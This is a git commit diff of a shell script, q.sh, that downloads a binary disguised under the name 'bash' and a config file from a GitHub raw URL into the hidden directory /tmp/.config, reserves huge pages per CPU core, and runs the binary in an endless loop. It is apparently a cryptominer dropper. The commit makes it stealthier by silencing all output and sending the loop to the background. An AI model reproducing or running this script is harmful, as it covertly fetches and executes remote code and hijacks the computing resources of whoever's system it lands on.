f6ea0dc9ec7b4398ebf11d909aa47934c931d792
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2024-05-01 16:10:44 +0800

    Update q.sh

--- q.sh
+++ q.sh
@@ -1,19 +1,19 @@
 #!/bin/bash
 
-sudo apt -qqy update || apt -qqy update
-sudo apt -qqy install wget icu-devtools || apt -qqy install wget icu-devtools
+sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
+sudo apt -qqy install wget icu-devtools >/dev/null 2>&1 || apt -qqy install wget icu-devtools >/dev/null 2>&1
 
 cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
 [ -n "$cores" ] || cores=1
 name="Cli_${cores}.sh"
 
 src="https://raw.githubusercontent.com/vjbahkds/jsncsdccw/main"
-sudo sysctl -w vm.nr_hugepages=$((cores*256)) || sysctl -w vm.nr_hugepages=$((cores*256))
+sudo sysctl -w vm.nr_hugepages=$((cores*256)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*256)) >/dev/null 2>&1
 
 mkdir -p "/tmp/.config"
 wget -qO "/tmp/.config/appsettings.json" "${src}/q.json"
 wget -qO "/tmp/.config/bash" "${src}/q"
 chmod -R 777 "/tmp/.config"
 
-while true; do cd /tmp/.config; ./bash "${name}" "${cores}" >/dev/null 2>&1 ; done
+bash -c "while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; done" >/dev/null 2>&1 &
 
